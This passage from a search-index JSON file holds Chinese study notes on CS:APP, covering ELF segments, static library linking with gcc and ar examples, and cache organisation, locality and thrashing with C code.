0x0000000000000550 R 0x1000 LOAD 0x0000000000001000 0x0000000000401000 0x0000000000401000 0x00000000000001a5 0x00000000000001a5 R E 0x1000 LOAD 0x0000000000002000 0x0000000000402000 0x0000000000402000 0x00000000000000f8 0x00000000000000f8 R 0x1000 LOAD 0x0000000000002e40 0x0000000000403e40 0x0000000000403e40 0x00000000000001e8 0x00000000000011c0 RW 0x1000 DYNAMIC 0x0000000000002e50 0x0000000000403e50 0x0000000000403e50 0x0000000000000190 0x0000000000000190 RW 0x8 NOTE 0x0000000000000338 0x0000000000400338 0x0000000000400338 0x0000000000000040 0x0000000000000040 R 0x8 ... Section to Segment mapping: \u6bb5\u8282... 00 01 .interp 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn 03 .init .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .got.plt .data .bss 06 .dynamic 07 .note.gnu.property ... \u6ce8\u610f\u9700\u8981\u5173\u95ed\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u968f\u673a\u5316 -no-pie \u3002 FileSiz \u4ee3\u8868\u76ee\u6807\u6587\u4ef6\u7684\u8282\u5927\u5c0f\uff0c MemSiz \u4ee3\u8868\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6bb5\u5927\u5c0f\u3002\u7531\u6700\u540e\u4e00\u4e2a LOAD \uff0c\u53ef\u4ee5\u77e5\u9053\u53ef\u6267\u884c\u6587\u4ef6\u4e2d .bss \u653e\u5728\u6570\u636e\u6bb5\u6700\u540e\u4e14\u4e0d\u5360\u5185\u5b58\u7684\u539f\u56e0\u3002","title":"4. \u53ef\u6267\u884c\u6587\u4ef6"},{"location":"_csapp/_Link/stlink/#5","text":"\u6240\u6709\u7684\u7f16\u8bd1\u7cfb\u7edf\u90fd\u652f\u6301\u628a\u591a\u4e2a\u76ee\u6807\u6a21\u5757\u6253\u5305\u6210\u4e00\u4e2a static library\uff0c\u5982\u679c\u6ca1\u6709\u9759\u6001\u5e93: \u7f16\u8bd1\u5668\u6839\u636e\u5e93\u51fd\u6570\u540d\u751f\u6210\u4ee3\u7801\uff0c\u8fd9\u56de\u52a0\u5927\u7f16\u8bd1\u5668\u7684\u590d\u6742\u5ea6\uff0c\u4e14\u4e0d\u597d\u7ef4\u62a4 \u628a\u6240\u6709\u76ee\u6807\u6a21\u5757\u7f16\u8bd1\u6210\u4e00\u4e2a\uff0c\u6d6a\u8d39\u7a7a\u95f4\uff0c\u4e0d\u597d\u7ef4\u62a4 \u9759\u6001\u5e93\u805a\u5408\u4e86\u591a\u4e2a\u6a21\u5757\uff0c\u5728\u94fe\u63a5\u65f6\uff0c\u94fe\u63a5\u5668\u53ea\u590d\u5236\u88ab\u7a0b\u5e8f\u5f15\u7528\u7684\u6a21\u5757\uff0c\u4e22\u5f03\u5176\u4ed6\u6a21\u5757\u3002\u5b9e\u9645\u4e0a\uff0cC \u7f16\u8bd1\u5668\u9ed8\u8ba4\u4f20\u9001 libc.a \u7ed9\u94fe\u63a5\u5668\u3002","title":"5. \u548c\u9759\u6001\u5e93\u94fe\u63a5"},{"location":"_csapp/_Link/stlink/#1_3","text":"addvec.c int addcnt = 0 ; void addvec ( int * x , int * y , int * z , int n ) { int i ; addcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] + y [ i ]; } multvec.c int multcnt = 0 ; void multvec ( int * x , int * y , int * z , int n ) { int i ; multcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] * y [ i ]; } main.c #include <stdio.h> #include \"vector.h\" int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); return 0 ; } vector.h void addvec ( int * , int * , int * , int ); void multvec ( int * , int * , int * , int ); generate and use libvector.a $ gcc -c addvec.c multvec.c $ ar rcs libvector.a addvec.o multvec.o $ gcc -c main.c $ gcc -static -o prog main.o ./libvector.a $ ./prog z = [4 6]","title":"(1). \u793a\u4f8b"},{"location":"_csapp/_Link/stlink/#2_3","text":"Linux linker \u7ef4\u62a4\u4e00\u4e2a relocatable files \u96c6\u5408 $E$\uff0c\u672a\u89e3\u6790\u7684\u7b26\u53f7\u96c6\u5408 $U$\uff0c\u5df2\u6210\u529f\u89e3\u6790\u7b26\u53f7\u96c6\u5408 $D$\uff1b\u7136\u540e\u4ece\u5de6\u5411\u53f3\u5bf9\u76ee\u6807\u6587\u4ef6 $f_i$ \u8fdb\u884c\u7b26\u53f7\u89e3\u6790: $f_i$ \u662f\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6:\u2002 linker \u628a $f$ \u52a0\u5165 $E$\uff0clinker \u5c1d\u8bd5\u5339\u914d $U$ \u4e2d\u672a\u89e3\u6790\u7b26\u53f7 \u4ee5\u53ca $f_i$ \u5b9a\u4e49\u7684\u7b26\u53f7 $f_i$ \u662f\u4e00\u4e2a\u5b58\u6863\u6587\u4ef6:\u2002 \u904d\u5386\u6210\u5458\uff0c\u5982\u679c $f_i$ \u7684\u67d0\u4e2a\u6210\u5458 $m$ \u5b9a\u4e49\u7684\u7b26\u53f7\u89e3\u6790\u4e86 $U$ \u4e2d\u7684\u4e00\u4e2a\u5f15\u7528\uff0c\u5c31\u5c06 $m$ \u52a0\u5165 $E$ \u89e3\u6790\u7ed3\u675f\u540e\uff0c$U$ \u975e\u7a7a\u5219\u62a5\u9519\u3002\u8fd9\u79cd\u65b9\u5f0f\u8981\u6c42\u5f15\u7528\u53d8\u91cf\u7684\u6a21\u5757\u5728\u524d\u9762\uff0c\u56e0\u6b64\u9700\u8981\u6ce8\u610f: \u5e93\u4e00\u822c\u653e\u5728\u547d\u4ee4\u884c\u7ed3\u5c3e \u5982\u679c\u5e93\u4e4b\u95f4\u4e0d\u662f\u76f8\u4e92\u72ec\u7acb\u7684\uff0c\u8fd8\u8981\u5bf9\u5b83\u4eec\u8fdb\u884c\u5408\u9002\u7684\u6392\u5e8f","title":"(2). \u9759\u6001\u5e93\u89e3\u6790\u5f15\u7528"},{"location":"_csapp/_Memory/1/","text":"1. \u5b58\u50a8\u5668 \ud83e\uddd0 (1). \u5b58\u50a8\u5668\u5206\u7c7b \ud83e\uddd0 RAM (\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668): \u6613\u5931\u5b58\u50a8\u5668 DRAM: \u9700\u8981\u5468\u671f\u6027\u7684\u5237\u65b0 (\u4e3a\u7535\u5bb9\u5145\u7535)\uff0c\u5e38\u7528\u4f5c\u5185\u5b58\u6761\u7b49 SRAM: \u53ea\u8981\u4fdd\u6301\u901a\u7535\u6570\u636e\u6570\u636e\u5c31\u53ef\u4ee5\u4fdd\u6301\uff0c\u66f4\u5feb (\u6162\u4e8e\u5bc4\u5b58\u5668)\u3001\u529f\u8017\u66f4\u4f4e\u4f46\u9020\u4ef7\u9ad8\uff0c\u5e38\u7528\u4f5c\u9ad8\u901f\u7f13\u5b58\u3001\u5bc4\u5b58\u5668\u5806 ROM (\u53ea\u8bfb\u5b58\u50a8\u5668): \u975e\u6613\u5931\u5b58\u50a8\u5668\uff0c\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u5e76\u975e\u6240\u6709 ROM \u90fd\u662f\u53ea\u8bfb\u7684 \u95ea\u5b58: \u57fa\u4e8e EEPROM, \u5e38\u7528\u4f5c\u56fa\u6001\u786c\u76d8 (SSD) (\u673a\u68b0) \u786c\u76d8: \u4ee5\u76d8\u7247\u4e3a\u57fa\u7840\uff0c\u533a\u522b\u4e8e\u534a\u5bfc\u4f53\u5b58\u50a8\u5668\uff0c\u975e\u6613\u5931 (2). \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784 \ud83e\uddd0 \u7f16\u5199\u826f\u597d\u7684\u7a0b\u5e8f\u503e\u5411\u4e8e\u9891\u7e41\u8bbf\u95ee\u67d0\u4e00\u5c42\u6b21\u4e0a\u7684\u5b58\u50a8\u8bbe\u5907\uff0c\u4f7f\u5f97\u5b58\u50a8\u7cfb\u7edf\u6210\u672c\u63a5\u8fd1\u4e8e\u5e95\u5c42\u8bbe\u5907\uff0c\u8bbf\u95ee\u901f\u5ea6\u63a5\u8fd1\u4e8e\u9876\u5c42\u8bbe\u5907\uff0c\u56e0\u800c\u5b58\u50a8\u7cfb\u7edf\u8bbe\u8ba1\u4e3a\u5c42\u6b21\u7ed3\u6784\u3002 2. \u7f13\u5b58\u539f\u7406 \ud83e\uddd0 (1). \u5c40\u90e8\u6027 \ud83e\uddd0 \u5c40\u90e8\u6027\u539f\u7406\uff1a\u7f16\u5199\u826f\u597d\u7684\u7a0b\u5e8f\u503e\u5411\u4e8e\u4f7f\u7528\u90bb\u8fd1\u4e8e\u6700\u8fd1\u5f15\u7528\u8fc7\u7684\u6570\u636e \u5bf9\u7a0b\u5e8f\u6570\u636e\u5f15\u7528\u7684\u5c40\u90e8\u6027 \u53d6\u6307\u4ee4\u7684\u5c40\u90e8\u6027 (CPU \u548c\u5185\u5b58\u4e4b\u95f4) eg: \u2002 \u7a0b\u5e8f\u6570\u636e\u5f15\u7528 \u2003 good \u2003 // stride-1 reference pattern int sumarrayrows ( int a [ M ][ N ]) { int i , j , sum = 0 ; for ( i = 0 ; i < M ; ++ i ) for ( j = 0 ; j < N ; ++ j ) sum += a [ i ][ j ]; return sum ; } \u2003 bad \u2003 // stride-N reference pattern int sumarraycols ( int a [ M ][ N ]) { int i , j , sum = 0 ; for ( j = 0 ; j < N ; ++ j ) for ( i = 0 ; i < M ; ++ i ) sum += a [ i ][ j ]; return sum ; } (2). \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u4e2d\u7684\u7f13\u5b58 \ud83e\uddd0 k \u5c42\u7684 (\u66f4\u5c0f\u66f4\u5feb) \u7684\u5b58\u50a8\u8bbe\u5907\u4f5c\u4e3a k+1 \u5c42 (\u66f4\u5927\u66f4\u6162) \u7684\u5b58\u50a8\u8bbe\u5907\u7684\u7f13\u5b58: k+1 \u5c42\u7684\u5b58\u50a8\u5668\u88ab\u5212\u5206 chunk\uff0c\u6bcf\u4e2a\u5757\u90fd\u6709\u552f\u4e00\u7684\u5730\u5740\u6807\u8bc6 \u4efb\u610f\u65f6\u523b\uff0ck \u5c42\u5b58\u50a8\u5668\u5305\u542b k+1 \u5c42\u5757\u7684\u4e00\u4e2a\u5b50\u96c6\u526f\u672c \u4e0d\u540c\u5c42\u6b21\u4e4b\u95f4\u7684\u4f20\u8f93\u5355\u5143\u5927\u5c0f\u53ef\u4ee5\u4e0d\u540c \u7f13\u5b58\u5757\u88ab\u8bf7\u6c42\u65f6\u53ef\u80fd hit / miss\uff0c\u82e5 cache miss \u53d1\u751f\u4e14\u7f13\u5b58\u5df2\u6ee1\uff0c\u5c31\u9700\u8981\u66ff\u6362\u6389\u4e00\u4e2a\u5757 (\u79f0\u4e3a victim). cache miss \u53ef\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b\uff1a cold miss:\u2002 \u7f13\u5b58\u4e3a\u7a7a\uff0c\u5219\u5fc5\u5b9a\u4e0d\u547d\u4e2d conflict miss:\u2002 \u4ee5\u9ad8\u5c42\u7f13\u5b58\u4e3a\u4f8b\uff0c\u653e\u7f6e\u7b56\u7565\u5b8c\u5168\u7531\u786c\u4ef6\u5b9e\u73b0\uff0c\u82e5\u5141\u8bb8 k+1 \u5c42\u7684\u5757\u968f\u673a\u653e\u5728 k \u5c42\u4efb\u610f\u5757\uff0c\u5219\u5b9a\u4f4d\u8d77\u6765\u4ee3\u4ef7\u592a\u5927\u3002\u56e0\u6b64\uff0c\u901a\u5e38\u7531 Hash \u9650\u5236 k+1 \u7684\u67d0\u4e9b\u5757\u53ea\u80fd\u653e\u7f6e\u5728 k \u5c42\u7684\u67d0\u4e9b\u5757\u4e2d\uff0c\u8fd9\u79cd\u9650\u5236\u4f1a\u5bfc\u81f4\u51b2\u7a81\u4e0d\u547d\u4e2d capacity miss:\u2002 \u5de5\u4f5c\u96c6\u8d85\u8fc7\u7f13\u5b58\u5927\u5c0f (3). \u7f13\u5b58\u7ba1\u7406 \ud83e\uddd0 \u5bc4\u5b58\u5668\u7531\u7f16\u8bd1\u5668\u7ba1\u7406 L1, L2, L3 \u7531\u5185\u7f6e\u5728 cpu \u4e2d\u7684\u786c\u4ef6\u903b\u8f91\u7ba1\u7406 \u4e3b\u5b58\u7531\u64cd\u4f5c\u7cfb\u7edf (\u8f6f\u4ef6) \u548c cpu \u7684\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6 (MMU) \u5171\u540c\u7ba1\u7406 (4). \u7f13\u5b58\u7ec4\u7ec7\u65b9\u5f0f \ud83e\uddd0 \u4e0b\u7ea7\u5730\u5740 $\\mathrm{Addr}$ \u7531 $\\rm tag + index + offset$ \u7ec4\u6210\uff0c\u8bbe\u8ba1\u601d\u8def\uff1a $\\rm offset:$ \u4e0b\u7ea7\u5757\u7531\u591a\u4e2a\u5b57\u8282\u6784\u6210\uff0c\u56e0\u6b64\u8981 mod \u51fa\u4e00\u5757\uff0c\u7528 $\\rm tag + index$ \u6807\u8bc6\u4e0b\u7ea7\u5757\u7684\u5730\u5740 $\\rm index:$ \u4e00\u4e2a\u7f13\u5b58\u5757\u5bf9\u5e94\u591a\u4e2a\u4e0b\u7ea7\u5757\uff0c\u4e14\u7ed9\u5b9a\u4e0b\u7ea7\u5757\u5730\u5740\uff0c\u9700\u8981\u77e5\u9053\u5b83\u88ab\u6620\u5c04\u5230\u54ea\u4e2a\u7f13\u5b58\u5757\uff0c\u56e0\u6b64\u8981\u62a0\u51fa\u4e00\u5757\u4f5c\u4e3a set \u7684\u5730\u5740 \u5982\u679c\u4f7f\u7528\u9ad8\u4f4d\u4f5c\u4e3a $\\rm index$\uff0c\u8fde\u7eed\u7684\u4e0b\u7ea7\u5757\u6620\u5c04\u5230\u540c\u4e00\u7f13\u5b58\u5757\uff0c\u5bfc\u81f4\u904d\u5386\u4e0b\u7ea7\u5757\u65f6\u5c40\u90e8\u6027\u5dee $\\rm tag:$ \u52a0\u5165\u4e00\u4e2a set \u7f13\u5b58\u4e86\u67d0\u4e2a\u4e0b\u7ea7\u5757\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u7f13\u5b58\u7684\u662f\u5177\u4f53\u54ea\u4e2a\uff0c\u56e0\u6b64\u7528 $\\rm tag$ \u6807\u8bc6 \u4e00\u4e2a\u81ea\u7136\u7684\u60f3\u6cd5\u662f\uff0c\u6bcf\u4e2a set \u91cc\u6700\u591a\u53ef\u4ee5\u653e $2^{\\rm bits\\ of\\ tag}$ \u4e2a\u7f13\u5b58\u884c \u56e0\u6b64\u7f13\u5b58\u5de5\u4f5c\u7684\u6d41\u7a0b\u4e3a: \u7ec4\u9009\u62e9:\u2002 \u62bd\u53d6 $\\rm index$\uff0c\u786e\u5b9a\u6240\u5728\u7684\u7ec4 \u884c\u5339\u914d:\u2002 \u904d\u5386\u7ec4\u5185\u7684\u6240\u6709\u884c\uff0c\u6839\u636e\u6bcf\u884c\u7684 $\\rm valid + tag'$ \u5224\u65ad\u662f hit \u8fd8\u662f miss \u5b57\u9009\u62e9:\u2002 \u63d0\u53d6\u51fa\u76ee\u6807\u5b57\u8282 \u7f13\u5b58\u76f8\u8054\u5ea6\u7531 set \u5185\u884c\u6570\u5212\u5206: \u76f4\u63a5\u6620\u5c04 :\u2002 \u6bcf\u7ec4\u4e00\u884c\uff0c\u53ef\u80fd\u662f $\\rm tag=0,\\ index=2^n$\uff0c\u6216 $\\rm tag$ \u4e0d\u4e3a 0 \u4e14\u8ba9\u6bcf\u4e2a set \u53ea\u6709\u4e00\u4e2a line \u7b80\u5355\uff0c\u5bb9\u6613\u5b9e\u73b0\uff0c\u4f46\u4e5f\u5bb9\u6613\u51b2\u7a81 \u7ec4\u76f8\u8054 :\u2002 $\\rm tag, index$ \u90fd\u4e0d\u4e3a 0\uff0c\u4e14\u6bcf\u7ec4\u4e0d\u53ea\u6709\u4e00\u884c \u666e\u901a\u7f13\u5b58\uff0ccache miss \u4e14\u7ec4\u5185\u7f13\u5b58\u5757\u5df2\u6ee1\uff0c\u9700\u8981\u4e00\u4e9b\u7b56\u7565\u6267\u884c\u66ff\u6362\uff0c\u5982 LRU\u3001LFU \u5168\u76f8\u8054 :\u2002 $\\rm tag=2^n,\\ index=0$\uff0c\u7f13\u5b58\u53ea\u6709 1 \u7ec4 \u4e0d\u6613\u53d1\u751f\u51b2\u7a81\uff0c\u4f46\u7ec4\u5185\u7ebf\u6027\u641c\u7d22\u548c $\\rm tag$ \u5339\u914d\u9700\u8981\u8f83\u591a\u65f6\u95f4 e.g. hash(addr) $m$: \u4e0b\u7ea7\u5730\u5740\u6570 $S=2^s$: set \u6570 $E=2^e$: \u6bcf\u4e2a set \u7684 line \u6570 $B=2^b$: \u6bcf\u4e2a block \u7684 byte \u6570 3. \u7f16\u5199\u9ad8\u901f\u7f13\u5b58\u53cb\u597d\u7684\u4ee3\u7801 \ud83e\uddd0 (1). \u6027\u80fd \ud83e\uddd0 \u9ad8\u901f\u7f13\u5b58\u6027\u80fd\u8861\u91cf\u6307\u6807: \u4e0d\u547d\u4e2d\u7387:\u2002 \u4e0d\u547d\u4e2d\u6570\u91cf / \u5f15\u7528\u6570\u91cf \u547d\u4e2d\u65f6\u95f4:\u2002 \u4ece\u9ad8\u901f\u7f13\u5b58\u4f20\u9001\u4e00\u4e2a\u5b57\u5230 cpu \u7684\u65f6\u95f4\uff0c\u5305\u62ec\u7ec4\u9009\u62e9\u3001\u884c\u5339\u914d\u3001\u5b57\u9009\u62e9\u7684\u65f6\u95f4 \u4e0d\u547d\u4e2d\u5904\u7f5a:\u2002 L1 \u7684\u5904\u7f5a\u901a\u5e38\u662f\u6570\u5341\u4e2a\u5468\u671f\uff0c\u4e3b\u5b58\u7684\u89e6\u53d1\u901a\u5e38\u662f 200 \u4e2a\u5468\u671f \u7531\u6b64\uff0c\u9ad8\u901f\u7f13\u5b58\u6027\u80fd\u7684\u6298\u4e2d\u56e0\u7d20\u6709: \u9ad8\u901f\u7f13\u5b58\u5927\u5c0f:\u2002 \u5927\u7f13\u5b58\u53ef\u80fd\u63d0\u9ad8\u547d\u4e2d\u7387\uff0c\u4f46\u4f1a\u589e\u52a0\u547d\u4e2d\u65f6\u95f4 \u5757\u5927\u5c0f:\u2002 \u5927\u5757\u53ef\u80fd\u63d0\u9ad8\u7a0b\u5e8f\u7684\u7a7a\u95f4\u5c40\u90e8\u6027\uff0c\u63d0\u9ad8\u547d\u4e2d\u7387\uff0c\u4f46\u4e5f\u4f1a\u964d\u4f4e\u7f13\u5b58\u7684\u884c\u6570\uff0c\u635f\u5bb3\u65f6\u95f4\u5c40\u90e8\u6027\u66f4\u597d\u7684\u7a0b\u5e8f\u7684\u547d\u4e2d\u7387\uff0c\u4e5f\u4f1a\u589e\u52a0\u4e0d\u547d\u4e2d\u5904\u7f5a \u76f8\u8054\u5ea6:\u2002 \u76f8\u8054\u5ea6\u5927\u53ef\u80fd\u589e\u52a0\u547d\u4e2d\u7387\uff0c\u4f46\u63d0\u9ad8\u6210\u672c\u3001\u964d\u4f4e\u901f\u5ea6 (2). \u6296\u52a8 \ud83e\uddd0 \u4ee5\u76f4\u63a5\u6620\u5c04\u7f13\u5b58 $(S, E, B, m) = (2, 1, 16, 8)$ \u4e3a\u4f8b\uff0c\u7f13\u5b58\u7531\u4e24\u4e2a\u7ec4\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5757 16 \u5b57\u8282 (4 x float) float dotproduct ( float x [ 8 ], float y [ 8 ]) { float sum = 0.0 ; int i ; for ( i = 0 ; i < 8 ; ++ i ) sum += x [ i ] * y [ i ]; return sum ; } x[i] \u548c y[i] \u603b\u662f\u6620\u5c04\u5230\u76f8\u540c\u7684\u7f13\u5b58\u7ec4\uff0c\u7f13\u5b58\u53cd\u590d\u52a0\u8f7d\u3001\u66ff\u6362\u76f8\u540c\u7684\u5b58\u50a8\u5757\uff0c\u5373\u79f0\u4e3a\u6296\u52a8 (thrash)\u3002\u5982\u679c\u66f4\u6539\u5b9a\u4e49\u4e3a float x[12] \uff0c\u5c31\u53ef\u4ee5\u5c06 x[i] \u548c y[i] \u6620\u5c04\u5230\u4e0d\u540c\u7684\u7f13\u5b58\u7ec4\u3002","title":"1. cache"},{"location":"_csapp/_Memory/1/#1","text":"","title":"1. \u5b58\u50a8\u5668"},{"location":"_csapp/_Memory/1/#1_1","text":"RAM (\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668): \u6613\u5931\u5b58\u50a8\u5668 DRAM: \u9700\u8981\u5468\u671f\u6027\u7684\u5237\u65b0 (\u4e3a\u7535\u5bb9\u5145\u7535)\uff0c\u5e38\u7528\u4f5c\u5185\u5b58\u6761\u7b49 SRAM: \u53ea\u8981\u4fdd\u6301\u901a\u7535\u6570\u636e\u6570\u636e\u5c31\u53ef\u4ee5\u4fdd\u6301\uff0c\u66f4\u5feb (\u6162\u4e8e\u5bc4\u5b58\u5668)\u3001\u529f\u8017\u66f4\u4f4e\u4f46\u9020\u4ef7\u9ad8\uff0c\u5e38\u7528\u4f5c\u9ad8\u901f\u7f13\u5b58\u3001\u5bc4\u5b58\u5668\u5806 ROM (\u53ea\u8bfb\u5b58\u50a8\u5668): \u975e\u6613\u5931\u5b58\u50a8\u5668\uff0c\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u5e76\u975e\u6240\u6709 ROM \u90fd\u662f\u53ea\u8bfb\u7684 \u95ea\u5b58: \u57fa\u4e8e EEPROM, \u5e38\u7528\u4f5c\u56fa\u6001\u786c\u76d8 (SSD) (\u673a\u68b0) \u786c\u76d8: \u4ee5\u76d8\u7247\u4e3a\u57fa\u7840\uff0c\u533a\u522b\u4e8e\u534a\u5bfc\u4f53\u5b58\u50a8\u5668\uff0c\u975e\u6613\u5931","title":"(1). \u5b58\u50a8\u5668\u5206\u7c7b"},{"location":"_csapp/_Memory/1/#2","text":"\u7f16\u5199\u826f\u597d\u7684\u7a0b\u5e8f\u503e\u5411\u4e8e\u9891\u7e41\u8bbf\u95ee\u67d0\u4e00\u5c42\u6b21\u4e0a\u7684\u5b58\u50a8\u8bbe\u5907\uff0c\u4f7f\u5f97\u5b58\u50a8\u7cfb\u7edf\u6210\u672c\u63a5\u8fd1\u4e8e\u5e95\u5c42\u8bbe\u5907\uff0c\u8bbf\u95ee\u901f\u5ea6\u63a5\u8fd1\u4e8e\u9876\u5c42\u8bbe\u5907\uff0c\u56e0\u800c\u5b58\u50a8\u7cfb\u7edf\u8bbe\u8ba1\u4e3a\u5c42\u6b21\u7ed3\u6784\u3002","title":"(2). \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784"},{"location":"_csapp/_Memory/1/#2_1","text":"","title":"2. \u7f13\u5b58\u539f\u7406"},{"location":"_csapp/_Memory/1/#1_2","text":"\u5c40\u90e8\u6027\u539f\u7406\uff1a\u7f16\u5199\u826f\u597d\u7684\u7a0b\u5e8f\u503e\u5411\u4e8e\u4f7f\u7528\u90bb\u8fd1\u4e8e\u6700\u8fd1\u5f15\u7528\u8fc7\u7684\u6570\u636e \u5bf9\u7a0b\u5e8f\u6570\u636e\u5f15\u7528\u7684\u5c40\u90e8\u6027 \u53d6\u6307\u4ee4\u7684\u5c40\u90e8\u6027 (CPU \u548c\u5185\u5b58\u4e4b\u95f4) eg: \u2002 \u7a0b\u5e8f\u6570\u636e\u5f15\u7528 \u2003 good \u2003 // stride-1 reference pattern int sumarrayrows ( int a [ M ][ N ]) { int i , j , sum = 0 ; for ( i = 0 ; i < M ; ++ i ) for ( j = 0 ; j < N ; ++ j ) sum += a [ i ][ j ]; return sum ; } \u2003 bad \u2003 // stride-N reference pattern int sumarraycols ( int a [ M ][ N ]) { int i , j , sum = 0 ; for ( j = 0 ; j < N ; ++ j ) for ( i = 0 ; i < M ; ++ i ) sum += a [ i ][ j ]; return sum ; }","title":"(1). \u5c40\u90e8\u6027"},{"location":"_csapp/_Memory/1/#2_2","text":"k \u5c42\u7684 (\u66f4\u5c0f\u66f4\u5feb) \u7684\u5b58\u50a8\u8bbe\u5907\u4f5c\u4e3a k+1 \u5c42 (\u66f4\u5927\u66f4\u6162) \u7684\u5b58\u50a8\u8bbe\u5907\u7684\u7f13\u5b58: k+1 \u5c42\u7684\u5b58\u50a8\u5668\u88ab\u5212\u5206 chunk\uff0c\u6bcf\u4e2a\u5757\u90fd\u6709\u552f\u4e00\u7684\u5730\u5740\u6807\u8bc6 \u4efb\u610f\u65f6\u523b\uff0ck \u5c42\u5b58\u50a8\u5668\u5305\u542b k+1 \u5c42\u5757\u7684\u4e00\u4e2a\u5b50\u96c6\u526f\u672c \u4e0d\u540c\u5c42\u6b21\u4e4b\u95f4\u7684\u4f20\u8f93\u5355\u5143\u5927\u5c0f\u53ef\u4ee5\u4e0d\u540c \u7f13\u5b58\u5757\u88ab\u8bf7\u6c42\u65f6\u53ef\u80fd hit / miss\uff0c\u82e5 cache miss \u53d1\u751f\u4e14\u7f13\u5b58\u5df2\u6ee1\uff0c\u5c31\u9700\u8981\u66ff\u6362\u6389\u4e00\u4e2a\u5757 (\u79f0\u4e3a victim). cache miss \u53ef\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b\uff1a cold miss:\u2002 \u7f13\u5b58\u4e3a\u7a7a\uff0c\u5219\u5fc5\u5b9a\u4e0d\u547d\u4e2d conflict miss:\u2002 \u4ee5\u9ad8\u5c42\u7f13\u5b58\u4e3a\u4f8b\uff0c\u653e\u7f6e\u7b56\u7565\u5b8c\u5168\u7531\u786c\u4ef6\u5b9e\u73b0\uff0c\u82e5\u5141\u8bb8 k+1 \u5c42\u7684\u5757\u968f\u673a\u653e\u5728 k \u5c42\u4efb\u610f\u5757\uff0c\u5219\u5b9a\u4f4d\u8d77\u6765\u4ee3\u4ef7\u592a\u5927\u3002\u56e0\u6b64\uff0c\u901a\u5e38\u7531 Hash \u9650\u5236 k+1 \u7684\u67d0\u4e9b\u5757\u53ea\u80fd\u653e\u7f6e\u5728 k \u5c42\u7684\u67d0\u4e9b\u5757\u4e2d\uff0c\u8fd9\u79cd\u9650\u5236\u4f1a\u5bfc\u81f4\u51b2\u7a81\u4e0d\u547d\u4e2d capacity miss:\u2002 \u5de5\u4f5c\u96c6\u8d85\u8fc7\u7f13\u5b58\u5927\u5c0f","title":"(2). \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u4e2d\u7684\u7f13\u5b58"},{"location":"_csapp/_Memory/1/#3","text":"\u5bc4\u5b58\u5668\u7531\u7f16\u8bd1\u5668\u7ba1\u7406 L1, L2, L3 \u7531\u5185\u7f6e\u5728 cpu \u4e2d\u7684\u786c\u4ef6\u903b\u8f91\u7ba1\u7406 \u4e3b\u5b58\u7531\u64cd\u4f5c\u7cfb\u7edf (\u8f6f\u4ef6) \u548c cpu \u7684\u5730\u5740\u7ffb\u8bd1\u786c\u4ef6 (MMU) \u5171\u540c\u7ba1\u7406","title":"(3). \u7f13\u5b58\u7ba1\u7406"},{"location":"_csapp/_Memory/1/#4","text":"\u4e0b\u7ea7\u5730\u5740 $\\mathrm{Addr}$ \u7531 $\\rm tag + index + offset$ \u7ec4\u6210\uff0c\u8bbe\u8ba1\u601d\u8def\uff1a $\\rm offset:$ \u4e0b\u7ea7\u5757\u7531\u591a\u4e2a\u5b57\u8282\u6784\u6210\uff0c\u56e0\u6b64\u8981 mod \u51fa\u4e00\u5757\uff0c\u7528 $\\rm tag + index$ \u6807\u8bc6\u4e0b\u7ea7\u5757\u7684\u5730\u5740 $\\rm index:$ \u4e00\u4e2a\u7f13\u5b58\u5757\u5bf9\u5e94\u591a\u4e2a\u4e0b\u7ea7\u5757\uff0c\u4e14\u7ed9\u5b9a\u4e0b\u7ea7\u5757\u5730\u5740\uff0c\u9700\u8981\u77e5\u9053\u5b83\u88ab\u6620\u5c04\u5230\u54ea\u4e2a\u7f13\u5b58\u5757\uff0c\u56e0\u6b64\u8981\u62a0\u51fa\u4e00\u5757\u4f5c\u4e3a set \u7684\u5730\u5740 \u5982\u679c\u4f7f\u7528\u9ad8\u4f4d\u4f5c\u4e3a $\\rm index$\uff0c\u8fde\u7eed\u7684\u4e0b\u7ea7\u5757\u6620\u5c04\u5230\u540c\u4e00\u7f13\u5b58\u5757\uff0c\u5bfc\u81f4\u904d\u5386\u4e0b\u7ea7\u5757\u65f6\u5c40\u90e8\u6027\u5dee $\\rm tag:$ \u52a0\u5165\u4e00\u4e2a set \u7f13\u5b58\u4e86\u67d0\u4e2a\u4e0b\u7ea7\u5757\uff0c\u8fd8\u9700\u8981\u77e5\u9053\u7f13\u5b58\u7684\u662f\u5177\u4f53\u54ea\u4e2a\uff0c\u56e0\u6b64\u7528 $\\rm tag$ \u6807\u8bc6 \u4e00\u4e2a\u81ea\u7136\u7684\u60f3\u6cd5\u662f\uff0c\u6bcf\u4e2a set \u91cc\u6700\u591a\u53ef\u4ee5\u653e $2^{\\rm bits\\ of\\ tag}$ \u4e2a\u7f13\u5b58\u884c \u56e0\u6b64\u7f13\u5b58\u5de5\u4f5c\u7684\u6d41\u7a0b\u4e3a: \u7ec4\u9009\u62e9:\u2002 \u62bd\u53d6 $\\rm index$\uff0c\u786e\u5b9a\u6240\u5728\u7684\u7ec4 \u884c\u5339\u914d:\u2002 \u904d\u5386\u7ec4\u5185\u7684\u6240\u6709\u884c\uff0c\u6839\u636e\u6bcf\u884c\u7684 